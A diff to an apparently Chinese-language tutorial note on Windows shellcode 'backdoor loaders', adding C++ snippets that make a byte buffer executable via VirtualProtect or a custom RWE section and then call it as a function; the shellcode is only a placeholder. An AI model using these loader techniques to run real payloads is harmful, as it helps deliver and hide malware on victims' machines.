@@ -6,15 +6,21 @@ keywords: backdoor loader 恶意软件
 
 
 ## 作为函数直接调用
+直接设置buf可执行  
 ```cpp
+#include <Windows.h>
 #include <stdio.h>
 
 int main() {
-	unsigned char buf[] ="\x11\x22";
+	unsigned char buf[] = "\x11\x22";
+
+	DWORD old;
+	VirtualProtect(buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &old);
 
 	void(*func)();
-	func = (void(*)())&buf;
+	func = (void(*)()) & buf;
 	func();
+	 //((void(*)())buf)();
 
 	return 0;
 }
@@ -33,6 +39,24 @@ int main() {
 		return 1;
 	memcpy(memory, buf, sizeof(buf));
 	((void(*)())memory)();
+
+	return 0;
+}
+```
+
+通过设置新段保证有可执行权限：  
+```cpp
+#include <Windows.h>
+#include <stdio.h>
+
+#pragma data_seg("vdata")
+unsigned char buf[] = "\x11\x22";
+#pragma data_seg()
+#pragma comment(linker, "/SECTION:vdata,RWE")
+
+int main() {
+	
+	((void(*)())buf)();
 
 	return 0;
 }
@@ -117,6 +141,7 @@ int main()
 2. 初九_9 https://www.bilibili.com/video/BV1Km4y1Z73g
 3. APC介绍: https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls
 4. https://www.bilibili.com/video/BV1GS4y1U7EN
+5. https://www.bilibili.com/video/BV1Ti4y1y7Dh
 
 
 ---
